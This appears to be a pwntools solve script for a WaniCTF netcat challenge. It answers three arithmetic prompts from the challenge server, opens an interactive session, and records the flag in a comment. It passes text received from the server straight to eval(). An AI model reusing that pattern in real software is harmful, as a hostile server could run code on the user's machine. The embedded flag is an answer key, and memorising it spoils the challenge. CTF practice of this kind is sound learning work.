from pwn import *
import re
import time
# for context
context.log_level = 'debug'
# for remote
host = 'netcat-pwn.wanictf.org'
port = 9001
io = None

def start():
    if not args.R:
        return process([exe.path])
    else:
        return remote(host, port)
def exploit(io):
    for i in range(3):
        time.sleep(0.5)
        r = io.recv(1500).decode().strip()
        print(r)
        l = r.split('\n')
        matches = [item for item in l if re.search(r'\d+\s?\+\s?\d+\s?=\s?', item)]
        print(matches)
        ne = str(matches[0]).replace('=' , '')
        s = eval(str(ne))
        io.sendline(str(s))
        time.sleep(0.5)
    io.interactive()

io = start()
exploit(io)
# FLAG{1375_k339_17_u9_4nd_m0v3_0n_2_7h3_n3x7!}

